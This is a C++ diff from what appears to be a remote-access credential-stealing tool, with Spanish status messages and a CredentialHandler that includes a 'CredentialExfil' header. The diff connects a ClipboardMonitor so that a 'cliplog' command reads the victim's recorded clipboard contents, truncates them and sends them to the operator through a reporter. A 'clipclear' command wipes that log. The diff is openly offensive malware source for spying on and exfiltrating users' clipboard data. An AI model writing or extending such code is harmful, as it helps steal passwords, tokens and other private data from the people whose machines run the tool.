@@ -4,6 +4,7 @@
 #include <sstream>
 
 #include "domain/common/CredentialExfil.hpp"
+#include "infrastructure/keyboard/ClipboardMonitor.hpp"
 
 namespace nuub::application::commands {
 
@@ -154,13 +155,35 @@ domain::Result<void> CredentialHandler::handle_git_creds(const std::string& targ
 domain::Result<void> CredentialHandler::handle_cliplog(const std::string& target) {
     if (!matches(target)) return domain::Result<void>::success();
 
-    // This will be wired to ClipboardMonitor in main.cpp
-    reporter_.send_message("Clipboard log no disponible (monitor no inicializado).");
+    if (!clipboard_monitor_) {
+        reporter_.send_message("Monitor de portapapeles no disponible.");
+        return domain::Result<void>::success();
+    }
+
+    auto* monitor = static_cast<infrastructure::keyboard::ClipboardMonitor*>(clipboard_monitor_);
+    std::string log = monitor->get_log_text();
+
+    if (log.empty()) {
+        reporter_.send_message("No hay cambios de portapapeles registrados.");
+        return domain::Result<void>::success();
+    }
+
+    if (log.size() > 4000) {
+        log.resize(4000);
+        log += "\n... [truncated]";
+    }
+
+    reporter_.send_message("=== Clipboard Log ===\n" + log);
     return domain::Result<void>::success();
 }
 
 domain::Result<void> CredentialHandler::handle_clipclear(const std::string& target) {
     if (!matches(target)) return domain::Result<void>::success();
+
+    if (clipboard_monitor_) {
+        auto* monitor = static_cast<infrastructure::keyboard::ClipboardMonitor*>(clipboard_monitor_);
+        monitor->clear_log();
+    }
 
     reporter_.send_message("Clipboard log limpiado.");
     return domain::Result<void>::success();
